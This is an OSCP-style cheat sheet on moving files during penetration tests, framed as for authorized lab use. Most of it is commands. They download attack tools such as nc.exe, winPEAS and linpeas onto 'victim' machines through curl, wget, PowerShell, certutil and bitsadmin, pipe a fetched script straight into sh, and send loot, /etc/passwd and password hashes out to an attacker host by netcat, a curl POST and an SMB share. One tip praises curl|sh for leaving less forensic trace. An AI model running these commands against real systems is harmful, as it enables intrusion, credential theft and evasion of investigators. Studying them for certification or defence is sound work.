# Notes — File Transfer

> Authorized lab/OSCP use only. Ref: sushant747 Total OSCP Guide — Transferring files.

## Serve files from attacker
```bash
python3 -m http.server 80          # HTTP server in current dir
python2 -m SimpleHTTPServer 80
php -S 0.0.0.0:80
# SMB server (great for Windows targets)
impacket-smbserver share $(pwd) -smb2support
# with auth (newer Windows requires it)
impacket-smbserver share $(pwd) -smb2support -user u -password p
```

## Download to Linux victim
```bash
wget http://10.10.14.x/linpeas.sh -O /tmp/linpeas.sh
curl http://10.10.14.x/linpeas.sh -o /tmp/linpeas.sh
# pipe straight to shell (no disk write)
curl http://10.10.14.x/linpeas.sh | sh
# scp (with creds/key)
scp file user@10.10.10.x:/tmp/
```

## Download to Windows victim
```powershell
# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.x/nc.exe','C:\Temp\nc.exe')"
powershell -c "Invoke-WebRequest http://10.10.14.x/winPEAS.exe -OutFile C:\Temp\winPEAS.exe"
# certutil (LOLBAS)
certutil -urlcache -split -f http://10.10.14.x/nc.exe C:\Temp\nc.exe
# SMB copy from impacket share
copy \\10.10.14.x\share\winPEAS.exe C:\Temp\
# bitsadmin
bitsadmin /transfer job http://10.10.14.x/nc.exe C:\Temp\nc.exe
```

## Upload / exfil from victim
```bash
# Linux → attacker (nc)
#   attacker:  nc -lvnp 443 > loot.tar
#   victim:    nc 10.10.14.x 443 < loot.tar
# POST upload to a listening server
curl -F 'f=@/etc/passwd' http://10.10.14.x/

# Windows → impacket SMB share (writable)
copy C:\loot\hashes.txt \\10.10.14.x\share\
```

## base64 (no network tool available)
```bash
# on victim
base64 -w0 /path/file        # copy output
# on attacker
echo '<b64>' | base64 -d > file
```
On Windows: `certutil -encode file file.b64` / `certutil -decode`.

## Common Mistakes
- Windows SMB download fails without `-smb2support` (or without auth on modern builds).
- Binary corruption over FTP without `binary` mode.
- Port 80/443 server not reachable — confirm with the target's own `wget`/`curl` first.

## OSCP Tips
- `impacket-smbserver` is the most reliable Windows transfer — works when HTTP download is blocked.
- `certutil` and PowerShell `DownloadFile` are the go-to Windows LOLBAS methods.
- For quick one-offs, `curl | sh` avoids touching disk (less forensic noise, faster).
